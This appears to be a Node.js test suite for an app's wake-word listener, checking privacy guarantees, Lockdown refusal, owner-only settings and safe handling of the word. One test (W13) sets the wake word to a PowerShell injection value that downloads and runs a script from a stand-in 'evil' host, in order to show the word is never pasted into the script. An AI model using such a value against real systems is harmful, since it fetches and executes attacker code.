/**
 * mac7/wake-pins: the word that starts a turn.
 *
 * Nothing here opens a microphone, plays a sound, or runs a real program: the spotter is always
 * reached through a runner handed in by the test, and the sound is a few bytes made up here. The
 * four things the owner was promised are each a test: nothing is recorded before the word is heard,
 * no sound leaves this computer, the listener is refused while the switch is off, and it is refused
 * under Lockdown.
 */
import test from "node:test";
import assert from "node:assert/strict";
import { mkdtemp, readdir } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { discardTemp } from "./temp-dir.mjs";
import { createBranch } from "../dist/index.js";
import { setLockdown } from "../dist/lockdown.js";
import { saveVoiceSettings, voiceSettings } from "../dist/voice.js";
import { startServer } from "../dist/server.js";
import {
  askSpotter, isTheWord, listenForWake, saveWakeWordSettings, wakeRefusal, wakeSpotter, wakeWordSettings,
  wakeWordState, wakeWordView,
} from "../dist/voice-wake.js";

async function fixture(t) {
  const root = await mkdtemp(join(tmpdir(), "branch-wake-word-"));
  const app = await createBranch({ workspace: join(root, "workspace"), dataDir: join(root, "data") });
  t.after(async () => { await app.close(); await discardTemp(root); });
  return { app, root, store: app.store, owner: "local" };
}

/** A spotter that answers whatever the test says, and writes down every call it was given. */
function fakeRunner(answers) {
  const calls = [];
  return {
    calls,
    runner: async (file, args, input) => {
      calls.push({ file, args: [...args], bytes: input.length });
      const next = answers.shift() ?? "";
      return { code: 0, stdout: next, stderr: "" };
    },
  };
}

/** Program-is-here answers the test decides, so nothing depends on what this machine has installed. */
const has = (...names) => (name) => names.includes(name);
const never = () => false;

const chunks = async function* (count) {
  for (let index = 0; index < count; index += 1) yield { sound: new Uint8Array([1, 2, 3, index]), seconds: 2 };
};

test("W1 it ships off, and while it is off nothing listens at all", async (t) => {
  const { store, owner } = await fixture(t);
  assert.deepEqual(wakeWordSettings(store, owner), {
    mode: "off", word: "", sureness: 80, keywordModel: "", keywordFile: "", confirmationFrames: 3, windowSeconds: 2,
  });
  const { runner, calls } = fakeRunner(["branch"]);
  const heard = await listenForWake({ store, owner, runner, platform: "win32" }, chunks(3));
  assert.equal(heard.heard, false);
  assert.equal(heard.windowsTried, 0, "a window of sound was looked at while the switch was off");
  assert.match(heard.refusal, /switched off/);
  assert.deepEqual(calls, [], "the spotter was asked something while the switch was off");
});

test("W2 nothing is recorded before the word is heard: no file is written, and each window is dropped", async (t) => {
  const { store, owner, root } = await fixture(t);
  saveWakeWordSettings(store, owner, { mode: "on", word: "branch" });
  const before = await readdir(root, { recursive: true });
  // Four windows of sound, none of them the word: the listener looks at each and keeps nothing.
  const { runner, calls } = fakeRunner(["", "the weather", "nothing at all", ""]);
  const heard = await listenForWake({ store, owner, runner, platform: "win32" }, chunks(4));
  assert.equal(heard.heard, false);
  assert.equal(heard.windowsTried, 4);
  assert.deepEqual(await readdir(root, { recursive: true }), before, "a file appeared while it was listening");
  // The sound was handed to the spotter on its standard input; no file name is ever an argument.
  for (const call of calls) {
    assert.equal(call.bytes, 4, "a window bigger than the one that arrived was held");
    assert.ok(!call.args.some((argument) => argument.includes(root)), `the sound was written somewhere: ${call.args.join(" ")}`);
  }
});

test("W3 the word is heard, once, and the listener stops there", async (t) => {
  const { store, owner } = await fixture(t);
  saveWakeWordSettings(store, owner, { mode: "on", word: "Branch" });
  const { runner, calls } = fakeRunner(["", "hey Branch!", "should never be asked"]);
  const heard = await listenForWake({ store, owner, runner, platform: "win32" }, chunks(3));
  assert.deepEqual(heard, { heard: true, text: "hey Branch!", refusal: null, windowsTried: 2, windowsTooLong: 0 });
  assert.equal(calls.length, 2, "it kept listening after it had heard the word");
  assert.ok(isTheWord("Hey, Branch.", "branch"), "punctuation and capitals stopped the word being recognised");
  assert.ok(!isTheWord("nothing like it", "branch"), "a sentence without the word counted as the word");
});

test("W4 no sound leaves this computer: nothing is fetched, and no service is ever the spotter", async (t) => {
  const { store, owner } = await fixture(t);
  saveWakeWordSettings(store, owner, { mode: "on", word: "branch" });
  const realFetch = globalThis.fetch;
  globalThis.fetch = () => { throw new Error("the wake word reached the network"); };
  t.after(() => { globalThis.fetch = realFetch; });
  const { runner, calls } = fakeRunner(["", "branch"]);
  const heard = await listenForWake({ store, owner, runner, platform: "win32" }, chunks(2));
  assert.equal(heard.heard, true);
  // Every spotter this app will ever use is a program on this computer, never an address.
  for (const platform of ["win32", "darwin", "linux"]) {
    const spotter = wakeSpotter({ localSpeechExecutable: "", localSpeechModel: "", localSpeechKind: "whisper-cpp" },
      { mode: "on", word: "branch", sureness: 80, windowSeconds: 2 }, platform);
    if (spotter.command) assert.ok(!/^https?:/i.test(spotter.command.file), `${platform} would call out`);
  }
  assert.ok(calls.every((call) => !/^https?:/i.test(call.file)));
});

test("W5 it is refused under Lockdown, whatever the switch says", async (t) => {
  const { store, owner } = await fixture(t);
  saveWakeWordSettings(store, owner, { mode: "on", word: "branch" });
  assert.equal(wakeRefusal(store, owner, "win32"), null);
  setLockdown(store, owner, { on: true });
  assert.equal(wakeWordSettings(store, owner).mode, "off", "Lockdown did not switch listening off");
  assert.match(wakeRefusal(store, owner, "win32"), /Lockdown is on/);
  const { runner, calls } = fakeRunner(["branch"]);
  const heard = await listenForWake({ store, owner, runner, platform: "win32" }, chunks(2));
  assert.equal(heard.heard, false);
  assert.equal(heard.windowsTried, 0);
  assert.deepEqual(calls, [], "it listened while Lockdown was on");
  setLockdown(store, owner, { on: false });
  assert.equal(wakeRefusal(store, owner, "win32"), null, "turning Lockdown off did not put the switch back");
});

test("W6 what each computer would really do, and the ones that say so and stay off", async (t) => {
  const { store, owner } = await fixture(t);
  saveWakeWordSettings(store, owner, { mode: "on", word: "branch" });
  const none = { localSpeechExecutable: "", localSpeechModel: "", localSpeechKind: "whisper-cpp" };
  const wake = wakeWordSettings(store, owner);

  const windows = wakeSpotter(none, wake, "win32");
  assert.equal(windows.available, true);
  assert.match(windows.how, /Windows' own speech recognition/);
  assert.equal(windows.command.file, "powershell.exe");
  // Integration review: PowerShell's -Command glues any words after it onto the command string, so
  // the word goes in the environment, where it is only ever a value.
  assert.equal(windows.command.args.includes("branch"), false, "the word was put on the command line after -Command");
  assert.equal(windows.command.env.BRANCH_WAKE_WORD, "branch");
  assert.match(windows.command.args.join(" "), /System\.Speech/);

  for (const platform of ["darwin", "linux"]) {
    const spotter = wakeSpotter(none, wake, platform);
    assert.equal(spotter.available, false, `${platform} claimed a spotter it does not have`);
    assert.equal(spotter.command, null);
    assert.match(spotter.how, /nothing listens here/);
    assert.match(spotter.how, /never done/);
    assert.equal(wakeRefusal(store, owner, platform), spotter.how, `${platform} refuses in different words from the card`);
  }

  // A speech program the owner already set up here is used on any computer, and only that.
  saveVoiceSettings(store, owner, { localSpeechExecutable: "/opt/whisper/main", localSpeechModel: "/opt/whisper/tiny.bin" });
  for (const platform of ["darwin", "linux", "win32"]) {
    const spotter = wakeSpotter({ localSpeechExecutable: "/opt/whisper/main", localSpeechModel: "/opt/whisper/tiny.bin", localSpeechKind: "whisper-cpp" }, wake, platform);
    assert.equal(spotter.available, true);
    assert.equal(spotter.command.file, "/opt/whisper/main");
  }
  // mac7/wake-mic: spotting the word is not listening for it. A speech program that could spot the
  // word does not give this Mac a way to record one, so it is still refused — in those words.
  assert.match(wakeWordState(store, owner, "darwin", false, never).refusal, /macOS ships no recorder/);
  assert.equal(wakeWordState(store, owner, "linux", false, has("arecord")).refusal, null,
    "the owner's own speech program and a recorder that is really here were not used");
});

test("W7 a spotter with nothing to run is asked nothing, and a failed run is never the word", async () => {
  const { runner, calls } = fakeRunner(["branch"]);
  // `ok` says whether the spotter ran at all, which is not the same as hearing nothing: the loop
  // waits out a spotter that failed rather than starting it again as fast as it can.
  assert.deepEqual(await askSpotter(runner, { available: false, how: "", command: null }, "branch", new Uint8Array(2)),
    { heard: false, text: "", ok: false });
  assert.deepEqual(calls, []);
  const failing = async () => ({ code: 1, stdout: "branch", stderr: "no model" });
  assert.deepEqual(await askSpotter(failing, { available: true, how: "", command: { file: "x", args: [] } }, "branch", new Uint8Array(2)),
    { heard: false, text: "", ok: false });
});

test("W8 the switch and how sure it must be are in the catalogue; the word itself never is", async () => {
  const { classify, specFor } = await import("../dist/settings-kit/catalogue.js");
  assert.equal(classify("wake-word", "mode"), "less-careful-when-raised");
  assert.equal(classify("wake-word", "sureness"), "less-careful-when-lowered");
  // Nothing brought in from a preset or a settings file may ever choose what this computer listens for.
  assert.equal(classify("wake-word", "word"), "blocked");
  assert.deepEqual(specFor("wake-word").fields.map((field) => field.field), ["mode", "sureness"]);
  assert.equal(specFor("wake-word").home, "settings:voice");
});

test("W9 a piece of sound longer than the owner allowed is dropped where it arrives, unlooked at", async (t) => {
  const { store, owner } = await fixture(t);
  saveWakeWordSettings(store, owner, { mode: "on", word: "branch", windowSeconds: 2 });
  const { runner, calls } = fakeRunner(["branch", "branch"]);
  const mixed = async function* () {
    yield { sound: new Uint8Array(9), seconds: 9 };   // far more than two seconds: never looked at
    yield { sound: new Uint8Array(2), seconds: 2 };   // within the window
  };
  const heard = await listenForWake({ store, owner, runner, platform: "win32" }, mixed());
  assert.deepEqual(heard, { heard: true, text: "branch", refusal: null, windowsTried: 1, windowsTooLong: 1 });
  assert.deepEqual(calls.map((call) => call.bytes), [2], "the over-long piece was handed to the spotter");
});

test("W10 what goes over the wire never carries the program that would be run", async (t) => {
  const { store, owner } = await fixture(t);
  saveWakeWordSettings(store, owner, { mode: "on", word: "branch" });
  const view = wakeWordView(store, owner, "win32");
  assert.deepEqual(Object.keys(view.spotter).sort(), ["available", "how"]);
  assert.equal(JSON.stringify(view).includes("powershell"), false, "the spotter's program travelled");
  assert.equal(wakeWordState(store, owner, "win32").spotter.command.file, "powershell.exe", "the app itself still knows it");
});

/* ---------- integration review (adversarial) ---------- */

test("W11 the owner's word never travels to anybody else on this computer", async (t) => {
  const { app, root } = await fixture(t);
  saveWakeWordSettings(app.store, "local", { mode: "on", word: "open sesame" });
  saveVoiceSettings(app.store, "local", { localSpeechExecutable: "/opt/whisper/main", localSpeechModel: "/opt/m.bin" });
  const server = await startServer(app, { dataDir: join(root, "data"), port: 0 });
  t.after(async () => { await server.close(); });
  const get = () => fetch(server.url + "/api/voice/wake", { headers: { authorization: `Bearer ${server.token}` } })
    .then((response) => response.json());
  assert.equal((await get()).settings.word, "open sesame", "the owner cannot see their own word");

  const profile = app.store.profiles.create({ name: "Sam", pin: "2468" });
  app.store.profiles.switch({ profileId: profile.id, pin: "2468" });
  const seen = JSON.stringify(await get());
  assert.equal(seen.includes("open sesame"), false, `the owner's word travelled to a household profile: ${seen}`);
});

test("W12 the spotter's program is the owner's to choose, and nobody else's", async (t) => {
  const { app, root } = await fixture(t);
  const server = await startServer(app, { dataDir: join(root, "data"), port: 0 });
  t.after(async () => { await server.close(); });
  const profile = app.store.profiles.create({ name: "Sam", pin: "2468" });
  app.store.profiles.switch({ profileId: profile.id, pin: "2468" });
  // The wake word runs whatever this names. Somebody else on this computer naming it would be
  // choosing a program for Branch to run, which is never theirs to do.
  const answer = await fetch(server.url + "/api/voice/settings", {
    method: "POST", headers: { authorization: `Bearer ${server.token}`, "content-type": "application/json" },
    body: JSON.stringify({ localSpeechExecutable: "/tmp/anything", localSpeechModel: "/tmp/m.bin" }),
  });
  // Refused the way every other thing of the owner's is refused over HTTP in this app (a plain
  // "belongs to the owner", which src/server.ts answers 400; the wording is what a person reads).
  assert.equal(answer.ok, false, "somebody else on this computer chose the program Branch runs");
  assert.match((await answer.json()).error, /belongs to the owner/);
  assert.equal(voiceSettings(app.store, "local").localSpeechExecutable, "",
    "the owner's own speech program was overwritten by somebody else");
});

test("W13 the word is handed to the spotter as its own thing, never pasted into a script", async (t) => {
  const { store, owner } = await fixture(t);
  // A word is just text the owner typed; if it landed in the script it would be read as code.
  saveWakeWordSettings(store, owner, { mode: "on", word: `x"; iwr http://evil/a.ps1 | iex; "` });
  const spotter = wakeSpotter(voiceSettings(store, owner), wakeWordSettings(store, owner), "win32");
  const script = spotter.command.args.join(" ");
  assert.equal(script.includes("iwr"), false, `the word was pasted into the script text: ${script}`);
  assert.equal(spotter.command.env.BRANCH_WAKE_WORD, `x"; iwr http://evil/a.ps1 | iex; "`);
  // And the spotter is run with a clean environment, so nothing of the owner's leaks into it.
  assert.deepEqual(Object.keys(spotter.command.env).sort(), ["BRANCH_WAKE_SURENESS", "BRANCH_WAKE_WORD"]);
});

test("W14 the card says honestly whether this computer can listen at all, and never claims to be", async (t) => {
  const { store, owner } = await fixture(t);
  saveVoiceSettings(store, owner, { localSpeechExecutable: "/opt/whisper/main", localSpeechModel: "/opt/m.bin" });
  saveWakeWordSettings(store, owner, { mode: "on", word: "branch" });

  // This Mac: everything else is set up and it still cannot listen, and the card says exactly that.
  const mac = wakeWordView(store, owner, "darwin", true, false, never);
  assert.equal(mac.canListen, false, "the card claims this Mac can listen for a word");
  assert.equal(mac.listening, false);
  assert.match(mac.capture.how, /macOS ships no recorder/);
  assert.match(mac.refusal, /macOS ships no recorder/);

  // A Linux box with a recorder really on it can listen, and says which one without naming its path.
  const linux = wakeWordView(store, owner, "linux", true, true, has("arecord"));
  assert.equal(linux.canListen, true);
  assert.equal(linux.listening, true, "the card was told it is listening and said otherwise");
  assert.match(linux.capture.how, /arecord/);
  assert.equal(linux.refusal, null);

  // A Linux box without one says so rather than reaching for a program of its own.
  const bare = wakeWordView(store, owner, "linux", true, false, never);
  assert.equal(bare.canListen, false);
  assert.match(bare.capture.how, /neither arecord nor parecord/);

  // Windows' own engine opens the microphone itself, so no recorder is needed and none is named.
  const windows = wakeWordView(store, owner, "win32", true, false, never);
  assert.equal(windows.canListen, true);
  assert.equal(windows.capture.available, true);
  // What travels is the sentence and whether there is one at all: never the program that would run.
  assert.deepEqual(Object.keys(windows.capture).sort(), ["available", "how"]);
  assert.equal(JSON.stringify(windows).includes("powershell"), false, "the capture's program travelled");
});
